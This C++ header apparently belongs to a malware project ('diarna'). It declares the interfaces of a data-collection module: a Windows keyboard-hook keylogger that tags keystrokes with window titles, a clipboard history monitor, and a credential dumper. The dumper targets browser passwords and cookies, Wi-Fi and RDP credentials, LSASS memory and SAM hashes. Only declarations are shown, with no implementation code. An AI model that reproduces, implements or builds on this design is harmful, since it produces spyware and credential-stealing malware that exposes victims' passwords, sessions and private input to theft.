#pragma once
#include <diarna/compiler_port.hpp>
#include <string>
#include <vector>
#include <cstdint>
#include <functional>
#include <atomic>
#include <thread>
#include <mutex>

namespace diarna::collection {

class Keylogger {
public:
    Keylogger();
    ~Keylogger();

    bool start();
    void stop();
    bool is_logging() const;

    std::string get_logs();
    void clear_logs();

    using LogCallback = std::function<void(const std::string& window_title,
                                            const std::string& keys)>;
    void set_callback(LogCallback cb);

private:
    std::atomic<bool> running_{false};
    std::thread hook_thread_;
    std::string log_buffer_;
    std::mutex log_mutex_;
    HHOOK keyboard_hook_ = nullptr;
    LogCallback on_log_;
    std::string current_window_;
    std::string current_keys_;
    std::chrono::steady_clock::time_point last_flush_;

    void install_hook();
    void remove_hook();
    static LRESULT CALLBACK keyboard_proc(int code, WPARAM wparam, LPARAM lparam);
    void process_key(DWORD vk_code, bool shift, bool ctrl, bool alt);
    void flush_if_needed();
    static std::wstring active_window_title();
};

class ClipboardMonitor {
public:
    ClipboardMonitor();
    ~ClipboardMonitor();

    bool start(std::chrono::milliseconds interval = std::chrono::seconds(2));
    void stop();
    bool is_monitoring() const;

    std::string get_last_clipboard();
    std::vector<std::string> get_history();

    void clear_history();

private:
    std::atomic<bool> running_{false};
    std::thread monitor_thread_;
    std::vector<std::string> history_;
    std::string last_clipboard_;
    std::mutex mutex_;
    std::chrono::milliseconds interval_{2000};

    void monitor_loop();
    std::string get_clipboard_text();
    uint32_t hash_text(const std::string& text);
};

class CredentialDumper {
public:
    CredentialDumper() = default;
    ~CredentialDumper() = default;

    struct StoredCredential {
        std::string url;
        std::string username;
        std::string password;
        std::string source;
    };

    std::vector<StoredCredential> dump_chrome_passwords();
    std::vector<StoredCredential> dump_edge_passwords();
    std::vector<StoredCredential> dump_firefox_passwords();
    std::vector<std::string> dump_wifi_passwords();
    std::vector<std::string> dump_saved_rdp();
    bool dump_lsass(const std::wstring& output_path);
    std::vector<std::string> dump_sam_hashes();
    bool dump_browser_cookies(const std::wstring& output_dir);

    struct BrowserAuth {
        std::string browser;
        std::string url;
        std::string username;
        std::string encrypted_password;
    };
    std::vector<BrowserAuth> dump_all_browsers();

private:
    bool decrypt_chrome_password(const std::vector<uint8_t>& encrypted,
                                  std::string& plaintext);
    std::wstring find_browser_profile(const std::wstring& browser_name);
};

} // namespace diarna::collection
